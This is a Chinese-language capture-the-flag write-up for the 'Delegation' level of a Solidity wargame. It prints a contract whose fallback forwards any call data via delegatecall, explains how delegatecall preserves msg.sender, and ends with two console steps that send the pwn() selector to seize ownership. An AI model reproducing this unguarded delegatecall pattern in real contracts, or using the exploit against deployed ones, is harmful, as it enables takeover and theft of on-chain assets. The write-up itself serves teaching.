# Delegation
Delegation 這一關要求我們成爲目標合約的owner,考察了幾個知識點，第一是delegatecall，第二是如何直接使用msg.data call函數，那我們先看一下合約代碼

## 合约代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```
## 代码分析
代碼包含了兩份合約，分別是`Delegation`和`Delegate`，Delegate合約中，除`constructor`以外，只有一個函數`pwn()`,可以用于將`msg.sender`指定爲`owner`。而在`Delegation`合約中，只有一個`fallback`函數，這個函數中用戶可以使用`delegatecall`入參`msg.data`來調用目標地址的合約。

那有人在這裏問我怎麽保證`Delegation`調用`pwn()`的時候`msg.sender`是我們的錢包地址，難道`msg.sender`不是`Delegation`地址而是我們的地址嗎？是的，這便是`call`和`delegatecall`的區別。如果將設我們是`A`,有一個`B`合約和`C`合約，我們通過`B`合約`call` `C`合約的函數，那麽在這個情境下，`msg.sender`是`B`合約的地址，`msg.value`是`B`合約給予的，但是如果我們通過`delegatecall` `C`合約的函數，那麽`msg.sender`就是我們的地址，`msg.value`是我們給予的。

接下來，就是第二個問題，如何寫`msg.data`。這裏附帶一下solidity官方文檔的原文：

>**Function Selector**  
The first four bytes of the call data for a function call specifies the function to be called. It is the first (left, high-order in big-endian) four bytes of the Keccak-256 hash of the signature of the function. The signature is defined as the canonical expression of the basic prototype without data location specifier, i.e. the function name with the parenthesised list of parameter types. Parameter types are split by a single comma - no spaces are used.

大致意思就是說，`msg.data`的前四個字節是函數的`selector`，這個`selector`是函數的`keccak256`哈希值的前四個字節。除了前四個字節外，我們還要在最開始加上`0x`。

我們可以通過兩種方式來獲取`selector`:
1. 使用web3.js的`web3.eth.abi.encodeFunctionSignature`函數
```
web3.eth.abi.encodeFunctionSignature('pwn()')
```
2. 使用`web3.utils.sha3`函數
```
web3.utils.sha3('pwn()').slice(0, 10)
```
理解這兩點我們就可以開始闖關了。

## 攻击过程
1. F12打開console,調用`web3.eth.abi.encodeFunctionSignature`函數獲取`pwn()`的selector,得到`'0xdd365b8b'`
2. 使用`contract.sendTransaction({data: '0xdd365b8b'})`調用`pwn()`函數,完成交易，并且完成本次的通關。
